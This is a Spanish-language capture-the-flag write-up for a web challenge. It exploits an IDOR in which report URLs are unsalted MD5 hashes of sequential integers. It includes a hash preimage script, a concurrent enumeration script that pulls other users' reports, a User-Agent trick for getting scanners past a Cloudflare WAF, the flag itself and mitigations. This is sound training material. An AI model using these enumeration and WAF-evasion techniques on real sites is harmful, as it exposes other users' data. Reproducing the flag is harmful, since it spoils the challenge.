# Apagar IA - SoftwareSeguro

**Dificultad:** CTF
**Fecha:** 09/2026
**Sistema:** Web
**Objetivo:** Obtener el código de apagado de 16 dígitos y entregar su hash MD5
**Acceso inicial:** Análisis del HTML + enumeración de identificadores + fuerza bruta de preimagen MD5

## Herramientas

`Chrome DevTools` `curl` `gobuster` `ffuf` `Python (hashlib, requests, concurrent.futures)`

## Técnicas

`IDOR` `Broken Object Level Authorization` `Weak Identifier Generation` `MD5 Preimage Bruteforce` `Web Enumeration` `HTTP Request Analysis`

## Introducción

El desafío consiste en encontrar un código de 16 dígitos capaz de "apagar" una IA fuera de control. El código se encuentra oculto dentro de un reporte al que el usuario no tiene acceso directo.

La aplicación otorga acceso inicial a 2 reportes propios, accesibles mediante URLs del tipo `/codes/<hash>/`, donde `<hash>` es un identificador de 32 caracteres hexadecimales con apariencia de hash MD5. Ninguno de los 2 reportes propios contiene el código buscado.

El objetivo es identificar cómo se genera el identificador de cada reporte y, a partir de eso, acceder a reportes ajenos hasta encontrar el que contiene el código.

## Reconocimiento

Al acceder a la URL raíz del challenge se observa una página "Mis reportes" con un listado de links:

```html
<ul>
  <li><a href="/codes/0e1422ea79781ee046484893ce0010c4/">0e1422ea79781ee046484893ce0010c4</a></li>
  <li><a href="/codes/0602940f23884f782058efac46f64b0f/">0602940f23884f782058efac46f64b0f</a></li>
</ul>
```

Cada link lleva a una página `/codes/<hash>/` que muestra una lista de aproximadamente 25 números de entre 7 y 9 dígitos. Ninguno de los dos reportes contiene un número de 16 dígitos.

El identificador de cada reporte tiene formato de hash MD5 (32 caracteres hexadecimales), lo que en un primer momento sugiere un token no enumerable.

## Análisis de las peticiones

Se descarta en primer lugar que el identificador dependa de la sesión o de la instancia del challenge: al reiniciar la instancia (cambiando la URL base por completo), los hashes listados en "Mis reportes" se mantuvieron exactamente iguales. Esto indica que el hash es una función determinística de algún valor estable, no un token aleatorio generado por sesión.

Se intenta enumerar rutas adicionales mediante `gobuster` y `ffuf` sobre `/` y `/codes/`. Se observa que el WAF (Cloudflare) bloquea en bloque las peticiones cuando el User-Agent corresponde a herramientas de pentesting, devolviendo `403` de forma masiva. Forzando un User-Agent de navegador real (`-a "Mozilla/5.0 ..."`) las peticiones pasan correctamente, pero no se encuentran rutas alternativas relevantes.

Se prueba acceder directamente a identificadores numéricos secuenciales (`/codes/1/`, `/codes/2/`, ...), obteniendo `404 Not Found` en todos los casos.

## Identificación del mecanismo de generación del hash

Se plantea la hipótesis de que el hash expuesto en la URL corresponde al MD5 de un identificador numérico entero simple (`hash = MD5(str(id))`), y se verifica mediante fuerza bruta sobre un rango de enteros:

```python
import hashlib

target1 = "0e1422ea79781ee046484893ce0010c4"
target2 = "0602940f23884f782058efac46f64b0f"

for i in range(0, 2_000_000):
    h = hashlib.md5(str(i).encode()).hexdigest()
    if h == target1:
        print("id1:", i)
    if h == target2:
        print("id2:", i)
```

Resultado:

```text
id1: 9912   -> MD5 = 0e1422ea79781ee046484893ce0010c4
id2: 9995   -> MD5 = 0602940f23884f782058efac46f64b0f
```

Se confirma que el backend utiliza un identificador entero secuencial, aplica MD5 sin sal ni componente aleatorio, y expone el resultado en la URL pública sin validar en ningún momento si el reporte solicitado pertenece al usuario autenticado. Esto constituye una vulnerabilidad de tipo IDOR: el espacio de identificadores es completamente enumerable pese a la apariencia de aleatoriedad del hash.

Los valores obtenidos (`9912` y `9995`) para los 2 reportes propios indican además que el contador de identificadores es global (compartido entre todos los usuarios de la plataforma), y no específico por usuario.

## Explotación

Con la fórmula `hash = MD5(str(id))` confirmada, se automatiza la solicitud de un rango de identificadores cercano a los valores propios conocidos, buscando en el contenido de cada respuesta un número de 16 dígitos mediante expresión regular.

```python
import hashlib
import requests
import re
import concurrent.futures

BASE_URL = "https://<instancia>-apagar-ia.softwareseguro.com.ar/codes/"
DESDE, HASTA = 9999, 13000
MAX_WORKERS = 5
REGEX_16 = re.compile(r"\b\d{16}\b")

def probar(numero):
    md5 = hashlib.md5(str(numero).encode()).hexdigest()
    url = f"{BASE_URL}{md5}/"
    r = requests.get(url, timeout=10)
    if r.status_code == 200:
        m = REGEX_16.search(r.text)
        if m:
            return (numero, md5, url, m.group(0))
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = [executor.submit(probar, n) for n in range(DESDE, HASTA)]
    for f in concurrent.futures.as_completed(futures):
        resultado = f.result()
        if resultado:
            numero, md5hash, url, codigo16 = resultado
            print(f"id={numero}  hash={md5hash}  codigo={codigo16}")
```

Durante la ejecución con alta concurrencia se observan ocasionalmente respuestas con status `200` que no corresponden a reportes reales, sino a contenido genérico devuelto por el servidor bajo carga. Por este motivo la validación se realiza sobre el contenido de la respuesta (presencia del patrón de 16 dígitos) y no únicamente sobre el status code.

## Obtención del código

La ejecución del script sobre el rango `9999-13000` produce el siguiente resultado:

```text
ENCONTRADO: id=11520
MD5: cdf49f5251e7b3eb4f009483121e9b64
URL: https://<instancia>-apagar-ia.softwareseguro.com.ar/codes/cdf49f5251e7b3eb4f009483121e9b64/
CODIGO DE 16 DIGITOS: 5524663362514956
```

Con el código obtenido, se calcula su hash MD5 para ser entregado como solución del desafío:

```bash
echo -n "5524663362514956" | md5sum
```

```text
a8e0e8ff02dde0f62fdf4de5142d7de0
```

## Cadena de explotación

```text
Inspección de "Mis reportes"
        ↓
Identificación del formato del identificador (hash de 32 hex)
        ↓
Reinicio de instancia: hash se mantiene igual
        ↓
Descarte de token por sesión/instancia
        ↓
Fuerza bruta de preimagen MD5 sobre enteros
        ↓
Confirmación: hash = MD5(id_entero_secuencial)
        ↓
Identificación de rango probable (contador global)
        ↓
Automatización de solicitudes sobre el rango
        ↓
Búsqueda de patrón de 16 dígitos en cada respuesta
        ↓
Obtención del código
        ↓
Cálculo del hash MD5 del código
```

## Evidencia

### Identificadores propios y su preimagen

```text
id=9912  -> hash=0e1422ea79781ee046484893ce0010c4
id=9995  -> hash=0602940f23884f782058efac46f64b0f
```

### Reporte con el código objetivo

```text
id=11520 -> hash=cdf49f5251e7b3eb4f009483121e9b64
```

### Código obtenido

```text
5524663362514956
```

### Hash MD5 entregado

```text
a8e0e8ff02dde0f62fdf4de5142d7de0
```

## Conclusión

El desafío demuestra cómo un identificador con apariencia de token aleatorio (un hash MD5 de 32 caracteres) puede ser completamente enumerable si el valor de entrada que lo genera pertenece a un espacio reducido y predecible, como un contador entero secuencial sin sal ni componente aleatorio.

La ausencia de validación de propiedad del recurso en el backend (el servidor no verifica que el reporte solicitado pertenezca al usuario autenticado) permitió, una vez identificado el mecanismo de generación del hash, iterar sobre un rango de identificadores hasta dar con el reporte que contenía el código de 16 dígitos.

El ejercicio permite practicar conceptos de IDOR (Insecure Direct Object Reference), análisis de mecanismos de generación de identificadores mediante ataques de preimagen, y automatización de explotación mediante scripts.

## Mitigación

1. No derivar identificadores públicos de valores predecibles (contadores secuenciales) mediante funciones hash sin sal ni componente aleatorio.
2. Validar en el backend que el recurso solicitado pertenece al usuario autenticado, independientemente de si el identificador es o no enumerable.
3. Utilizar identificadores con entropía genuina (UUIDv4) o tokens firmados (HMAC) cuando se requiera un identificador público no adivinable.
